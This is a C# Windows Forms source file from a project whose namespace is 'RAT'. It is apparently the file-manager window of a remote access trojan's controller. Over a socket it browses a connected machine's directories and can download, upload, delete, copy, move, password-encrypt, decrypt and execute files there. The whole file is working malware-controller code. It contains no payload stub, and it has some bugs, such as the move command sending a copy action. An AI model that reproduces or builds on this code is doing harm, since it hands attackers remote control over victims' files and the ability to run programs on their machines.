using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net;
using System.IO;
using System.Net.Sockets;

namespace RAT
{
    public partial class FrmFiles : Form
    {
        public Socket client;
        public static bool Confirmed = false;
        public Main parentForm;
        public String Temp = "";
        public String CurrentDir = "";
        public void ChunkConfirmed()
        {
            Confirmed = true;
        }

        public void UpdateDirectoryList(List<String> Directories, List<String> Files, String Directory)
        {
            listView1.Items.Clear();
            textBox1.Text = Directory;
            CurrentDir = Directory;
            ListViewItem lviT = new ListViewItem();
            lviT.Text = "..";
            lviT.SubItems.Add("Directory");
            listView1.Items.Add(lviT);
            foreach (String Dir in Directories)
            {
                //MessageBox.Show(Dir);
                if (Dir != "")
                {
                    ListViewItem lvi = new ListViewItem();
                    lvi.Text = Dir;
                    lvi.SubItems.Add("Directory");
                    listView1.Items.Add(lvi);
                }
                else
                {
                }
            }
            foreach (String File in Files)
            {
                if (File != "")
                {
                    ListViewItem lvi = new ListViewItem();
                    lvi.Text = File;
                    lvi.SubItems.Add("File");
                    listView1.Items.Add(lvi);
                }
            }
        }

        public void UpdateTitle(String Title, FrmFiles self)
        {
            if (self.InvokeRequired)
            {
               self.BeginInvoke((MethodInvoker)delegate ()
               {
                   try
                   {
                       if (Title == "END")
                       {
                           self.Text = "File Manager - [" + self.client.RemoteEndPoint.ToString() + "]";
                       }
                       else
                       {
                           self.Text = self.Text.Replace(Temp, Title);
                       }
                   }
                   catch
                   {
                       if (Title == "END")
                       {
                           self.Text = "File Manager - [" + self.client.RemoteEndPoint.ToString() + "]";
                       }
                       else
                       {
                           self.Text = self.client.RemoteEndPoint.ToString() + " - " + Title;
                       }
                   }
               });
            }
            else
            {
                try
                {
                    if (Title == "END")
                    {
                        self.Text = "File Manager - [" + self.client.RemoteEndPoint.ToString() + "]";
                    }
                    else
                    {
                        self.Text = self.Text.Replace(Temp, Title);
                    }
                }
                catch
                {
                    if (Title == "END")
                    {
                        self.Text = "File Manager - [" + self.client.RemoteEndPoint.ToString() + "]";
                    }
                    else
                    {
                        self.Text = self.client.RemoteEndPoint.ToString() + " - " + Title;
                    }
                }
            }
        }

        public FrmFiles(Socket CurrClient, Main main)
        {
            InitializeComponent();
            client = CurrClient;
            parentForm = main;
        }

        private void FrmFiles_Load(object sender, EventArgs e)
        {
            this.Text = "File Manager - [" + client.RemoteEndPoint.ToString() + "]";
            client.Send(Encoding.ASCII.GetBytes("FileDetail|GetDirectory|"));
        }

        private void listView1_MouseDown(object sender, MouseEventArgs e)
        {
            try
            {
                if (e.Button == MouseButtons.Right)
                {
                    if (listView1.SelectedItems.Count > 0)
                    {
                        if (listView1.SelectedItems[0].SubItems[1].Text != "Directory")
                        {
                            contextMenuStrip1.Show(Cursor.Position);
                        }
                        else
                        {
                            contextMenuStrip2.Show(Cursor.Position);
                        }
                    }
                    else
                    {
                        contextMenuStrip2.Show(Cursor.Position);
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.ToString());
            }
        }

        private void listView1_SelectedIndexChanged(object sender, EventArgs e)
        {
            try
            {
                if (listView1.SelectedItems[0].SubItems[1].Text == "Directory")
                {
                    if (listView1.SelectedItems[0].Text == "..")
                    {
                        char[] CharacterCheck = textBox1.Text.ToCharArray();
                        if (CharacterCheck[CharacterCheck.Count() - 1] != '\\')
                        {
                            List<String> DirectoryPartitons = textBox1.Text.Split('\\').ToList();
                            DirectoryPartitons.RemoveAt(DirectoryPartitons.Count - 1);
                            textBox1.Text = "";
                            foreach (String Part in DirectoryPartitons)
                            {
                                textBox1.Text = textBox1.Text + Part + "\\";
                            }
                        }
                        else
                        {
                            List<String> DirectoryPartitions = textBox1.Text.Split('\\').ToList();
                            DirectoryPartitions.RemoveAt(DirectoryPartitions.Count - 2);
                            textBox1.Text = "";
                            foreach (String Part in DirectoryPartitions)
                            {
                                if (Part != "")
                                {
                                    textBox1.Text = textBox1.Text + Part + "\\";
                                }
                            }
                        }
                    }
                    else
                    {
                        textBox1.Text = listView1.SelectedItems[0].Text;
                    }
                }
            }
            catch { }
        }

        private void downloadToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems[0].SubItems[1].Text != "Directory")
            {
                //Receive File Request
                using (SaveFileDialog sfd = new SaveFileDialog())
                {
                    sfd.RestoreDirectory = true;
                    sfd.InitialDirectory = System.Reflection.Assembly.GetExecutingAssembly().Location;
                    sfd.Filter = "All Files (*.*)|*.*";
                    if (sfd.ShowDialog() == DialogResult.OK)
                    {
                        parentForm.UpdateClientDownload(client);
                        String PacketToSend = "BeginDownload|" + listView1.SelectedItems[0].Text + "|" + sfd.FileName;
                        client.Send(Encoding.ASCII.GetBytes(PacketToSend));
                    }
                }
            }
        }

        private void button1_Click(object sender, EventArgs e)
        {
            String PacketToSend = "FileDetail|GetDirectory|" + textBox1.Text;
            client.Send(Encoding.ASCII.GetBytes(PacketToSend));
        }

        private void uploadToolStripMenuItem_Click(object sender, EventArgs e)//, String Location = null)
        {
            //String Location = null;
            if (sender.ToString() != true.ToString())
            {
                if (listView1.SelectedItems[0].SubItems[1].Text != "Directory")
                {   
                //Send File Request
                
                    using (OpenFileDialog ofd = new OpenFileDialog())
                    {
                        ofd.Title = "Open...";
                        ofd.RestoreDirectory = true;
                        ofd.InitialDirectory = System.Reflection.Assembly.GetExecutingAssembly().Location;
                        ofd.Filter = "Any File (*.*)|*.*";
                        if (ofd.ShowDialog() == DialogResult.OK)
                        {
                            try
                            {
                                List<String> DirectoryParts = listView1.SelectedItems[0].Text.Split('\\').ToList();
                                String CurrentDirectory = "";
                                String FileName = Path.GetFileName(ofd.FileName);
                                if (listView1.SelectedItems[0].Text.ToCharArray()[listView1.SelectedItems[0].Text.ToCharArray().Count() - 1] == '\\')
                                {
                                    DirectoryParts.RemoveAt(DirectoryParts.Count - 1);
                                }
                                DirectoryParts.RemoveAt(DirectoryParts.Count - 1);
                                foreach (String DirPart in DirectoryParts)
                                {
                                    CurrentDirectory = CurrentDirectory + DirPart + "\\";
                                }
                                String ResultingFilePath = CurrentDirectory + FileName;
                                String PacketToSend = "BeginUpload|" + ResultingFilePath;
                                this.Text = this.Text + " - Starting Upload...";
                                //Read and send chunks
                                FileInfo fi = new FileInfo(ofd.FileName);
                                int FileLength = (int)fi.Length;
                                double RequestedChunkSize = FileLength / 50;
                                int RealChunkSize = (int)RequestedChunkSize + 1;
                                if (RealChunkSize > 1000000)
                                {
                                    RealChunkSize = 750000;
                                }
                                int ReadBytes = 0;
                                int BytesRemaining = FileLength;
                                PacketToSend = PacketToSend + "|" + FileLength.ToString();
                                client.Send(Encoding.ASCII.GetBytes(PacketToSend));
                                String Temp = "";
                                this.Text = this.Text.Replace("Starting Upload...", "0 / " + FileLength.ToString());
                                Temp = "0 / " + FileLength.ToString();
                                //read file
                                using (FileStream fs = new FileStream(ofd.FileName, FileMode.Open, FileAccess.Read))
                                {
                                    //MessageBox.Show("File Opened!");
                                    while (ReadBytes < FileLength)
                                    {
                                        //MessageBox.Show(ReadBytes.ToString() + " < " + FileLength.ToString());
                                        if (BytesRemaining < RealChunkSize)
                                        {
                                            //MessageBox.Show("BytesRemaining < RealChunkSize");
                                            byte[] Chunk = new byte[BytesRemaining];
                                            fs.Read(Chunk, 0, BytesRemaining);
                                            Confirmed = false;
                                            List<byte> DataPacket = new List<byte>();
                                            DataPacket.Add(Encoding.ASCII.GetBytes("$")[0]);
                                            DataPacket.AddRange(Chunk);
                                            client.Send(DataPacket.ToArray());
                                            while (Confirmed == false)
                                            {
                                                System.Threading.Thread.Sleep(250);
                                            }
                                            ReadBytes = ReadBytes + BytesRemaining;
                                        }
                                        else
                                        {
                                            //MessageBox.Show("Full Size Chuck");
                                            byte[] Chunk = new byte[RealChunkSize];
                                            fs.Read(Chunk, 0, RealChunkSize);
                                            Confirmed = false;
                                            List<byte> DataPacket = new List<byte>();
                                            DataPacket.Add(Encoding.ASCII.GetBytes("@")[0]);
                                            DataPacket.AddRange(Chunk);
                                            client.Send(DataPacket.ToArray());
                                            while (Confirmed == false)
                                            {
                                                System.Threading.Thread.Sleep(250);
                                            }
                                            ReadBytes = ReadBytes + RealChunkSize;
                                            BytesRemaining = BytesRemaining - RealChunkSize;
                                        }
                                        this.Text = this.Text.Replace(Temp, ReadBytes.ToString() + " / " + FileLength.ToString());
                                        Temp = ReadBytes.ToString() + " / " + FileLength.ToString();
                                    }
                                    ReadBytes = 0;
                                    fs.Close();
                                }
                                //while not confirmed sleep
                                Confirmed = false;
                                this.Text = this.Text.Replace("] - " + Temp, "]");
                                button1_Click(null, null);
                                //PacketToSend = "EndUpload";
                                //client.Send(Encoding.ASCII.GetBytes(PacketToSend));
                            }
                            catch (Exception ex)
                            {
                                MessageBox.Show(ex.ToString());
                            }
                        }
                    }
                }
            }
            else
            {
                if (listView1.SelectedItems.Count == 0)
                {
                    //CurrentDir
                    String Location = CurrentDir;
                    using (OpenFileDialog ofd = new OpenFileDialog())
                    {
                        ofd.Title = "Open...";
                        ofd.RestoreDirectory = true;
                        ofd.InitialDirectory = System.Reflection.Assembly.GetExecutingAssembly().Location;
                        ofd.Filter = "Any File (*.*)|*.*";
                        if (ofd.ShowDialog() == DialogResult.OK)
                        {
                            String ResultingFilePath = Location + "\\" + Path.GetFileName(ofd.FileName);
                            String PacketToSend = "BeginUpload|" + ResultingFilePath;
                            this.Text = this.Text + " - Starting Upload...";
                            //Read and send chunks
                            FileInfo fi = new FileInfo(ofd.FileName);
                            int FileLength = (int)fi.Length;
                            double RequestedChunkSize = FileLength / 50;
                            int RealChunkSize = (int)RequestedChunkSize + 1;
                            if (RealChunkSize > 1000000)
                            {
                                RealChunkSize = 750000;
                            }
                            int ReadBytes = 0;
                            int BytesRemaining = FileLength;
                            PacketToSend = PacketToSend + "|" + FileLength.ToString();
                            client.Send(Encoding.ASCII.GetBytes(PacketToSend));
                            String Temp = "";
                            this.Text = this.Text.Replace("Starting Upload...", "0 / " + FileLength.ToString());
                            Temp = "0 / " + FileLength.ToString();
                            //read file
                            using (FileStream fs = new FileStream(ofd.FileName, FileMode.Open, FileAccess.Read))
                            {
                                //MessageBox.Show("File Opened!");
                                while (ReadBytes < FileLength)
                                {
                                    //MessageBox.Show(ReadBytes.ToString() + " < " + FileLength.ToString());
                                    if (BytesRemaining < RealChunkSize)
                                    {
                                        //MessageBox.Show("BytesRemaining < RealChunkSize");
                                        byte[] Chunk = new byte[BytesRemaining];
                                        fs.Read(Chunk, 0, BytesRemaining);
                                        Confirmed = false;
                                        List<byte> DataPacket = new List<byte>();
                                        DataPacket.Add(Encoding.ASCII.GetBytes("$")[0]);
                                        DataPacket.AddRange(Chunk);
                                        client.Send(DataPacket.ToArray());
                                        while (Confirmed == false)
                                        {
                                            System.Threading.Thread.Sleep(250);
                                        }
                                        ReadBytes = ReadBytes + BytesRemaining + 1;
                                    }
                                    else
                                    {
                                        //MessageBox.Show("Full Size Chuck");
                                        byte[] Chunk = new byte[RealChunkSize + 1];
                                        fs.Read(Chunk, 0, RealChunkSize);
                                        Confirmed = false;
                                        List<byte> DataPacket = new List<byte>();
                                        DataPacket.Add(Encoding.ASCII.GetBytes("@")[0]);
                                        DataPacket.AddRange(Chunk);
                                        client.Send(DataPacket.ToArray());
                                        while (Confirmed == false)
                                        {
                                            System.Threading.Thread.Sleep(250);
                                        }
                                        ReadBytes = ReadBytes + RealChunkSize;
                                        BytesRemaining = BytesRemaining - RealChunkSize;
                                    }
                                    this.Text = this.Text.Replace(Temp, ReadBytes.ToString() + " / " + FileLength.ToString());
                                    Temp = ReadBytes.ToString() + " / " + FileLength.ToString();
                                }
                                ReadBytes = 0;
                                fs.Close();
                            }
                            //while not confirmed sleep
                            Confirmed = false;
                            this.Text = this.Text.Replace("] - " + Temp, "]");
                            button1_Click(null, null);
                            //PacketToSend = "EndUpload";
                            //client.Send(Encoding.ASCII.GetBytes(PacketToSend));
                        }
                    }
                }
                else
                {
                    //Selected Directory
                    if (listView1.SelectedItems[0].Text != "..")
                    {
                        String Location = listView1.SelectedItems[0].Text; //Check ".."
                        using (OpenFileDialog ofd = new OpenFileDialog())
                        {
                            ofd.Title = "Open...";
                            ofd.RestoreDirectory = true;
                            ofd.InitialDirectory = System.Reflection.Assembly.GetExecutingAssembly().Location;
                            ofd.Filter = "Any File (*.*)|*.*";
                            if (ofd.ShowDialog() == DialogResult.OK)
                            {
                                String ResultingFilePath = Location + "\\" + Path.GetFileName(ofd.FileName);
                                //MessageBox.Show(ResultingFilePath);
                                String PacketToSend = "BeginUpload|" + ResultingFilePath;
                                this.Text = this.Text + " - Starting Upload...";
                                //Read and send chunks
                                FileInfo fi = new FileInfo(ofd.FileName);
                                int FileLength = (int)fi.Length;
                                double RequestedChunkSize = FileLength / 50;
                                int RealChunkSize = (int)RequestedChunkSize + 1;
                                if (RealChunkSize > 1000000)
                                {
                                    RealChunkSize = 750000;
                                }
                                int ReadBytes = 0;
                                int BytesRemaining = FileLength;
                                PacketToSend = PacketToSend + "|" + FileLength.ToString();
                                client.Send(Encoding.ASCII.GetBytes(PacketToSend));
                                String Temp = "";
                                this.Text = this.Text.Replace("Starting Upload...", "0 / " + FileLength.ToString());
                                Temp = "0 / " + FileLength.ToString();
                                //read file
                                using (FileStream fs = new FileStream(ofd.FileName, FileMode.Open, FileAccess.Read))
                                {
                                    //MessageBox.Show("File Opened!");
                                    while (ReadBytes < FileLength)
                                    {
                                        //MessageBox.Show(ReadBytes.ToString() + " < " + FileLength.ToString());
                                        if (BytesRemaining < RealChunkSize)
                                        {
                                            //MessageBox.Show("BytesRemaining < RealChunkSize");
                                            byte[] Chunk = new byte[BytesRemaining];
                                            fs.Read(Chunk, 0, BytesRemaining);
                                            Confirmed = false;
                                            List<byte> DataPacket = new List<byte>();
                                            DataPacket.Add(Encoding.ASCII.GetBytes("$")[0]);
                                            DataPacket.AddRange(Chunk);
                                            client.Send(DataPacket.ToArray());
                                            while (Confirmed == false)
                                            {
                                                System.Threading.Thread.Sleep(250);
                                            }
                                            ReadBytes = ReadBytes + BytesRemaining + 1;
                                        }
                                        else
                                        {
                                            //MessageBox.Show("Full Size Chuck");
                                            byte[] Chunk = new byte[RealChunkSize + 1];
                                            fs.Read(Chunk, 0, RealChunkSize);
                                            Confirmed = false;
                                            List<byte> DataPacket = new List<byte>();
                                            DataPacket.Add(Encoding.ASCII.GetBytes("@")[0]);
                                            DataPacket.AddRange(Chunk);
                                            client.Send(DataPacket.ToArray());
                                            while (Confirmed == false)
                                            {
                                                System.Threading.Thread.Sleep(250);
                                            }
                                            ReadBytes = ReadBytes + RealChunkSize;
                                            BytesRemaining = BytesRemaining - RealChunkSize;
                                        }
                                        this.Text = this.Text.Replace(Temp, ReadBytes.ToString() + " / " + FileLength.ToString());
                                        Temp = ReadBytes.ToString() + " / " + FileLength.ToString();
                                    }
                                    ReadBytes = 0;
                                    fs.Close();
                                }
                                //while not confirmed sleep
                                Confirmed = false;
                                this.Text = this.Text.Replace("] - " + Temp, "]");
                                button1_Click(null, null);
                                //PacketToSend = "EndUpload";
                                //client.Send(Encoding.ASCII.GetBytes(PacketToSend));
                            }
                        }
                    }
                    else
                    {
                        //Get Root Directory
                    }
                }
            }
        }

        private void deleteToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems[0].SubItems[1].Text != "Directory")
            {
                //Delete File Request
                String PacketToSend = "FileDetail|Action|Delete|" + listView1.SelectedItems[0].Text;
                client.Send(Encoding.ASCII.GetBytes(PacketToSend));
                PacketToSend = "FileDetail|GetDirectory|" + textBox1.Text;
                client.Send(Encoding.ASCII.GetBytes(PacketToSend));
            }
        }

        private void encryptToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems[0].SubItems[1].Text != "Directory")
            {
                //Encrypt File Request
                EncDecInput FrmUserInput = new EncDecInput("encrypt");
                if (FrmUserInput.ShowDialog() == DialogResult.OK)
                {
                    String Pass = FrmUserInput.ReturnValue;
                    String PacketToSend = "FileDetail|Action|Encrypt|" + Pass + "|" + listView1.SelectedItems[0].Text;
                    client.Send(Encoding.ASCII.GetBytes(PacketToSend));
                }
            }
        }

        private void decryptToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems[0].SubItems[1].Text != "Directory")
            {
                //Decrypt File Request
                EncDecInput FrmUserInput = new EncDecInput("decrypt");
                if (FrmUserInput.ShowDialog() == DialogResult.OK)
                {
                    String Pass = FrmUserInput.ReturnValue;
                    String PacketToSend = "FileDetail|Action|Decrypt|" + Pass + "|" + listView1.SelectedItems[0].Text;
                    client.Send(Encoding.ASCII.GetBytes(PacketToSend));
                }
            }
        }

        private void copyToToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems[0].SubItems[1].Text != "Directory")
            {
                //Copy To File Request
                CpMovInput FrmUserInput = new CpMovInput("copy");
                if (FrmUserInput.ShowDialog() == DialogResult.OK)
                {
                    String Directory = FrmUserInput.ReturnValue;
                    String PacketToSend = "FileDetail|Action|CopyTo|" + Directory + "|" + listView1.SelectedItems[0].Text;
                    client.Send(Encoding.ASCII.GetBytes(PacketToSend));
                }
            }
        }

        private void moveToToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems[0].SubItems[1].Text != "Directory")
            {
                //Move To File Request
                CpMovInput FrmUserInput = new CpMovInput("move");
                if (FrmUserInput.ShowDialog() == DialogResult.OK)
                {
                    String Directory = FrmUserInput.ReturnValue;
                    String PacketToSend = "FileDetail|Action|CopyTo|" + Directory + "|" + listView1.SelectedItems[0].Text;
                    client.Send(Encoding.ASCII.GetBytes(PacketToSend));
                }
            }
        }

        private void executeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems[0].SubItems[1].Text != "Directory")
            {
                //Execute File Request
                String PacketToSend = "FileDetail|Action|Execute|" + listView1.SelectedItems[0].Text;
                client.Send(Encoding.ASCII.GetBytes(PacketToSend));
            }
        }

        private void uploadToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            uploadToolStripMenuItem_Click(true, null); //Fix
        }
    }
}
